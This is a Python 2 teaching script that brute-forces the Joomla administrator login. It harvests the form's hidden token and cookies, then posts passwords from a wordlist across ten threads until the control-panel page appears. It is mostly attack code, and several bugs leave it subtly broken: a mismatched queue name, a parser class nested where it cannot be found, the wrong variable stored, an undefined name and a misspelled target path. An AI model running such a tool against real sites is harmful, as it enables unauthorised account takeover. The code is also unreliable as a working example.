#!/usr/bin/env python

__author__ = "bt3"


"""

Now we are going to learn how to brute force a web server.
Most web system have brute-force protection these days, such as
captcha, math equations or a login token that has to be submitted
with request.

In this script we will brute force Joomla, whih lack account lockouts
or strong captchas by default. To brute force it, we need to retrieve
the login token from the login before submitting the password attempt
and ensure that we accept cookies in the session.

1) Install Joomla: https://docs.joomla.org/J3.x:Installing_Joomla
2) Fire ```target/administrator''' and find PHP elements

We see that the form gets submitted to the ```/administrator/index.php```
path as an HTTP POST. You also see that there is a name attribute set to a
long, randomized string. This srting is checked against current user
session, stored in a cookie that is passed in the session:

1. Retriever the login page and accept all cookies that are returned.
2. Parse out all of the form elements from HTML.
3. Set the username/passowrd to a guess from dicitonary
(https://code.google.com/p/grimwepa/downloads/detail?name=cain.txt)
4. Send an HTTP POST to the login processing script including all HTML form fields and our stored cookies.
5. Test to see if we have sucessfully logged into the web app.



"""

import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser
from brute_forcing_locations import build_wordlist


THREAD = 10
USERNAME = 'admin'
WORDLIST = '../files_and_dir_lists/passwords/cain.txt'
RESUME = None
# where the script donwload and parse HTML
TARGET_URL = 'http://localhost:80/admininstrator/index.php'
# where to submit the brute-force
TARGET_POST = 'http://localhost:80/admininstrator/index.php'
USERNAME_FIELD = 'username'
PASSWORD_FIELD = 'passwd'
# check for after each brute-forcing attempting to determine sucess
SUCESS_CHECK = 'Administration - Control Panel'


class Bruter(object):
    def __init__(self, username, words):
        self.username   = username
        self.password_q   = words
        self.found      = False
        print 'Finished setting up for: ' + username

    def run_bruteforce(self):
        for i in range(THREAD):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            # after we grab our password attempt, we set the cookie jar,
            # and this calss will store cookies in the cookies file
            jar = cookielib.FileCookieJar('cookies')
            # initialize the urllib2 opener
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(TARGET_URL)
            page = response.read()
            print "Trying: %s : %s (%d left)" %(self.username, brute, \
                self.passwd_q.qsize())

            # parse out the hidden fields
            # make the initial request to retrieve the login form
            # when we have the raw html we pass it off our html parser
            # and call its feed method, which returns a dictionary of all
            # the retrieved form elements
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[USERNAME_FIELD] = self.username
            post_tags[PASSWORD_FIELD] = brute

            # URL encode the POST variables and pass it to the
            # HTTP request
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(TARGET_POST, login_data)

            login_result = login_response.read()

            if SUCESS_CHECK in login_result:
                self.found = True
                print '[*] Bruteforce successful.'
                print '[*] Username: ' + username
                print '[*] Password: ' + brute
                print '[*] Waiting for the other threads to exit...'


    # core of our HTML processing: the HTML parsing class to use
    # against the target.

    class BruteParser(HTMLParser):
        def __init__(self):
            HTMLParser.__init__(self)
            # creaaate a dictionary for results
            self.tag_results = {}

        # called whenever a tag is found
        def handle_starttag(self, tag, attrs):
            # we are look for input tags
            if tag == 'input':
                tag_name = None
                tag_value = None
                for name, value in attrs:
                    if name == 'name':
                        tag_name = value
                    if name == 'value':
                        tag_value = value

                if tag_name is not None:
                    self.tag_results[tag_name] = value




if __name__ == '__main__':
    words = build_wordlist(WORDLIST)
    brute_obj = Bruter(USERNAME, words)
    brute_obj.run_bruteforce()

